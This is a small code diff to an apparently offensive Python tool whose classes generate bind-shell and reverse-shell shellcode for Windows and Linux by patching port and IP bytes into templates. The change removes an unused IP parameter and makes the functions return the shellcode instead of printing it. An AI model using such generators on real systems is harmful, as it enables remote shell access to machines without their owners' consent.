@@ -6,14 +6,14 @@ class generate_bind_shell:
     Generate bind shell shellcode
     """
 
-    def windows_bind_tcp(ip, port):
+    def windows_bind_tcp(port):
         """
-        Replaces IP and PORT
+        Replaces PORT
         """
 
-    def linux_bind_tcp(ip, port):
+    def linux_bind_tcp(port):
         """
-        Replaces IP and PORT
+        Replaces PORT
         """
         
         code =  ""
@@ -35,7 +35,7 @@ class generate_bind_shell:
         port = hex(socket.htons(int(port)))
         code = code.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))
 
-        print(code)
+        return code
 
 class generate_reverse_shell:
     """
@@ -111,4 +111,4 @@ class generate_reverse_shell:
             b4 = ip_bytes[0]
         ))
 
-        print(code)
+        return code
